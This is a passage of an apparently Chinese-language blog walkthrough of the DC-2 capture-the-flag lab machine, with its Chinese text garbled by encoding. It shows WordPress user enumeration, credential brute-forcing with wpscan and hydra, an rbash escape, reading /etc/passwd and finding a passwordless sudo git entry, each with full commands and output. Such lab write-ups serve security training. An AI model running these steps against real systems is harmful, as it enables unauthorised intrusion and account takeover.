              </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/themes/                                       </span><br><span class="line">---- Entering directory: http://dc-2/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/network/ ----</span><br><span class="line">+ http://dc-2/wp-admin/network/admin.php (CODE:302|SIZE:0)                           </span><br><span class="line">+ http://dc-2/wp-admin/network/index.php (CODE:302|SIZE:0)                           </span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/user/ ----</span><br><span class="line">+ http://dc-2/wp-admin/user/admin.php (CODE:302|SIZE:0)                             </span><br><span class="line">+ http://dc-2/wp-admin/user/index.php (CODE:302|SIZE:0)                             </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/languages/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">---- Entering directory: http://dc-2/wp-content/plugins/ ----</span><br><span class="line">+ http://dc-2/wp-content/plugins/index.php (CODE:200|SIZE:0)                         </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/themes/ ----</span><br><span class="line">+ http://dc-2/wp-content/themes/index.php (CODE:200|SIZE:0)                         </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Fri Aug 21 01:08:24 2020</span><br><span class="line">DOWNLOADED: 32284 - FOUND: 12</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p><code>å¯ä»¥å‘ç°é‡å®šå‘åˆ°äº†wp-login.php</code></p>
<img src="/2020/08/21/DC-2/image-20200821131351459.png" class>

<p><code>ç”±äºæ˜¯wordpress cmsï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨wpscan</code></p>
<h2 id="0x07-wpscanæ‰«æ"><a href="#0x07-wpscanæ‰«æ" class="headerlink" title="0x07.wpscanæ‰«æ"></a>0x07.wpscanæ‰«æ</h2><p><code>æ‰«æå­˜åœ¨çš„ç”¨æˆ·</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># wpscan --url dc-2 -e u</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.4</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://dc-2/ [192.168.1.4]</span></span><br><span class="line"><span class="string">[+] Started: Fri Aug 21 00:37:54 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://dc-2/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentyseventeen</span></span><br><span class="line"><span class="string"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Last Updated: 2020-08-11T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 2.4</span></span><br><span class="line"><span class="string"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Seventeen</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span></span><br><span class="line"><span class="string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.2 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;</span>Version: 1.2<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] admin</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] jerry</span></span><br><span class="line"><span class="string"> | Found By: Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] tom</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Fri Aug 21 00:37:57 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 27</span></span><br><span class="line"><span class="string">[+] Cached Requests: 34</span></span><br><span class="line"><span class="string">[+] Data Sent: 6.255 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 230.303 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 159.527 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:02</span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC2# </span></span><br></pre></td></tr></table></figure>

<p><code>æ‰¾åˆ°admin,jerry,tomä¸‰ä¸ªç”¨æˆ·</code></p>
<p><code>å¯†ç å­—å…¸å‰é¢å·²ç»ç”Ÿæˆï¼Œä¸‹é¢åˆ›å»ºç”¨æˆ·åå­—å…¸</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># cat users.dict </span></span><br><span class="line">admin</span><br><span class="line">jerry</span><br><span class="line">tom</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p><code>ä½¿ç”¨wpscançˆ†ç ´ï¼Œä¹Ÿå¯ä»¥ç”¨bp</code></p>
<p><code>å‘ç°äº†jerryä¸tomçš„å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># wpscan --url dc-2 -U users.dict -P pwd.dict </span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.4</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Valid Combinations Found:</span></span><br><span class="line"><span class="string"> | Username: jerry, Password: adipiscing</span></span><br><span class="line"><span class="string"> | Username: tom, Password: parturient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Fri Aug 21 01:19:20 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 702</span></span><br><span class="line"><span class="string">[+] Cached Requests: 5</span></span><br><span class="line"><span class="string">[+] Data Sent: 319.78 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 684.152 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 209.777 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:44</span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC2# </span></span><br></pre></td></tr></table></figure>

<p><code>ä¸‹é¢å…ˆå°è¯•tomç™»å…¥ç½‘ç«™ï¼ŒæˆåŠŸç™»å…¥</code></p>
<img src="/2020/08/21/DC-2/image-20200821132254191.png" class>

<p><code>æ‰‹åŠ¨çˆ¬è™«æ²¡æœ‰å‘ç°flagï¼Œflag1æç¤ºï¼šå¦‚æœæ‰¾ä¸åˆ°è¯·ä»¥å…¶ä»–èº«ä»½ç™»å…¥ï¼Œä¸‹é¢ä½¿ç”¨jerryç™»å…¥</code></p>
<p><code>å‘ç°flag2ï¼Œä¸æç¤º</code></p>
<img src="/2020/08/21/DC-2/image-20200821132951876.png" class>

<p><code>æ ¹æ®æç¤ºå¸Œæœ›æˆ‘æ‰¾åˆ°å¦ä¸€ä¸ªå…¥å£ï¼Œå‰é¢å‘ç°å¼€æ”¾äº†sshï¼Œæ‰€ä»¥ä¸‹é¢çˆ†ç ´ssh</code></p>
<h2 id="0x08-çˆ†ç ´ssh"><a href="#0x08-çˆ†ç ´ssh" class="headerlink" title="0x08.çˆ†ç ´ssh"></a>0x08.çˆ†ç ´ssh</h2><p><code>å¯†ç ç«Ÿç„¶ä¸webå¯†ç ä¸€æ ·ï¼Œé‚£æˆ‘è¿˜çˆ†ç ´ä¸ªğŸ”¨ï¼</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># hydra -L users.dict -P pwd.dict ssh://192.168.1.4 -s 7744 -f -vV -o hydra.ssh</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;penatibus&quot;</span> - 683 of 720 [child 3] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;magnis&quot;</span> - 684 of 720 [child 12] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;dis&quot;</span> - 685 of 720 [child 13] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;parturient&quot;</span> - 686 of 720 [child 8] (0/3)</span><br><span class="line">[7744][ssh] host: 192.168.1.4   login: tom   password: parturient</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.1.4 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-21 01:47:28</span><br><span class="line">root@JIYE:~/tmp/DC2</span><br></pre></td></tr></table></figure>

<h2 id="0x09-sshç™»å…¥"><a href="#0x09-sshç™»å…¥" class="headerlink" title="0x09.sshç™»å…¥"></a>0x09.sshç™»å…¥</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># ssh tom@192.168.1.4 -p 7744 </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.1.4]:7744 ([192.168.1.4]:7744)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:ZbyT03GNDQgEmA5AMiTX2N685NTzZuOoyMDIA+DW1qU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.1.4]:7744<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">tom@192.168.1.4&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure>

<p><code>å‘ç°flag3.txtï¼ŒæŸ¥çœ‹å‘ç°æœ‰</code><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vcmJhc2gtYS1yZXN0cmljdGVkLWJhc2gtc2hlbGwtZXhwbGFpbmVkLXdpdGgtcHJhY3RpY2FsLWV4YW1wbGVzLw==">rbashé™åˆ¶<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">-rbash: cat: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<h2 id="0x10-rbashç»•è¿‡"><a href="#0x10-rbashç»•è¿‡" class="headerlink" title="0x10.rbashç»•è¿‡"></a>0x10.rbashç»•è¿‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">$ /bin/bash</span><br><span class="line">tom@DC-2:~$ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">/bin/bash</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt </span><br><span class="line">bash: cat: <span class="built_in">command</span> not found</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure>

<p><code>è¿™å›ä¸ºbash: cat: command not founï¼Œä¸‹é¢å¯¼å…¥ç¯å¢ƒå˜é‡</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹åˆ°flag3</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin</span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt </span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su <span class="keyword">for</span> all the stress he causes.</span><br><span class="line">tom@DC-2:~$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¯æ€œçš„è€æ±¤å§†æ€»æ˜¯è¿½èµ¶æ°ç‘ã€‚ä¹Ÿè®¸ä»–åº”è¯¥ä¸ºè‡ªå·±é€ æˆçš„å‹åŠ›æ„Ÿåˆ°éš¾è¿‡ã€‚</p>
</blockquote>
<p><code>çº¿ç´¢æŒ‡å‘jerry</code>ç”¨æˆ·</p>
<p><code>æŸ¥çœ‹/etc/passwdï¼Œå‘ç°jerryï¼Œä¸º/bin/bashå¯ä»¥ç™»å…¥</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">Debian-exim:x:104:109::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:105:110::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:106:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash</span><br><span class="line">jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure>

<h2 id="0x11-jerryç™»å…¥"><a href="#0x11-jerryç™»å…¥" class="headerlink" title="0x11.jerryç™»å…¥"></a>0x11.jerryç™»å…¥</h2><p><code>ç”±äºå‰é¢çš„tomç”¨æˆ·çš„ç™»å…¥å¯†ç ä¸web applicationå¯†ç ç›¸åŒï¼Œä¸‹é¢å°è¯•jerryçš„</code></p>
<p><code>æœç„¶æ˜¯å¯ä»¥çš„</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tom@DC-2:~$ su jerry</span><br><span class="line">Password: </span><br><span class="line">jerry@DC-2:/home/tom$</span><br></pre></td></tr></table></figure>

<p><code>è¿›å…¥åˆ°ç”¨æˆ·å®¶ç›®å½•å‘ç°flag4</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:/home/tom$ <span class="built_in">cd</span> </span><br><span class="line">jerry@DC-2:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">jerry@DC-2:~$ cat flag4.txt </span><br><span class="line">Good to see that you<span class="string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">&#x27;re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jerry@DC-2:~$</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¾ˆé«˜å…´çœ‹åˆ°ä½ å·²ç»èµ°äº†è¿™ä¹ˆè¿œï¼Œä½†ä½ è¿˜æ²¡å›å®¶ã€‚</p>
<p>ä½ ä»ç„¶éœ€è¦å¾—åˆ°æœ€åçš„æ ‡å¿—ï¼ˆå”¯ä¸€çœŸæ­£é‡è¦çš„æ ‡å¿—ï¼ï¼ï¼ï¼‰ã€‚</p>
<p>è¿™é‡Œæ²¡æœ‰æç¤º-ä½ ç°åœ¨åªèƒ½é è‡ªå·±äº†ã€‚:-)</p>
<p>å»å§-ç¦»å¼€è¿™é‡Œï¼ï¼ï¼ï¼</p>
</blockquote>
<p><code>å°è¯•è¿›å…¥/rootï¼Œæ²¡æœ‰æƒé™</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ <span class="built_in">cd</span> /root</span><br><span class="line">bash: <span class="built_in">cd</span>: /root: Permission denied</span><br><span class="line">jerry@DC-2:~$</span><br></pre></td></tr></table></figure>

<p><code>æ ¹æ®æç¤ºä¿¡æ¯ï¼Œä½¿ç”¨gitè¿›è¡Œææƒ</code></p>
<p><code>sudo -lï¼Œå‘ç°gitå‘½ä»¤åœ¨/usr/bin/gitä¸‹ï¼Œæ­¤å‘½ä»¤åœ¨ä»¥sudoå‘½ä»¤è¿è¡Œæ—¶å…·æœ‰rootæƒé™ï¼Œä¸”ä¸éœ€è¦å¯†ç </code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line">jerry@DC-2:~$</span><br></pre></td></tr></table></figure>

<p><code>å°è¯•sudo gitï¼Œå‘ç°æ˜¯å¯ä»¥è°ƒç”¨çš„</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git</span><br><span class="line">usage: git [--version] [--<span class="built_in">help</span>] [-C &lt;path&gt;] [-c name=value]</span><br><span class="line">           [--<span class="built_in">exec</span>-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]</span><br><span class="line">           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]</span><br><span class="line">           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]</span><br><span class="line">           &lt;<span class="built_in">command</span>&gt; [&lt;args&gt;]</span><br><span class="line"></span><br><span class="line">The most commonly used git commands are:</span><br><span class="line">   add        Add file contents to the index</span><br><span class="line">   bisect     Find by binary search the change that introduced a bug</span><br><span class="line">   branch     List, create, or delete branches</span><br><span class="line">   checkout   Checkout a branch or paths to the working tree</span><br><span class="line">   <span class="built_in">clone</span>      Clone a repository into a new directory</span><br><span class="line">   commit     Record changes to the repository</span><br><span class="line">   diff       Show changes between commits, commit and working tree, etc</span><br><span class="line">   fetch      Download objects and refs from another repository</span><br><span class="line">   grep       Print lines matching a pattern</span><br><span class="line">   init       Create an empty Git repository or reinitialize an existing one</span><br><span class="line">   <span class="built_in">log</span>        Show commit logs</span><br><span class="line">   merge      Join two or more development histories together</span><br><span class="line">   mv         Move or rename a file, a directory, or a symlink</span><br><span class="line">   pull       Fetch from and integrate with another repository or a <span class="built_in">local</span> branch</span><br><span class="line">   push       Update remote refs along with associated objects</span><br><span class="line">   rebase     Forward-port <span class="built_in">local</span> commits to the updated upstream head</span><br><span class="line">   reset      Reset current HEAD to the specified state</span><br><span class="line">   rm         Remove files from the working tree and from the index</span><br><span class="line">   show       Show various types of 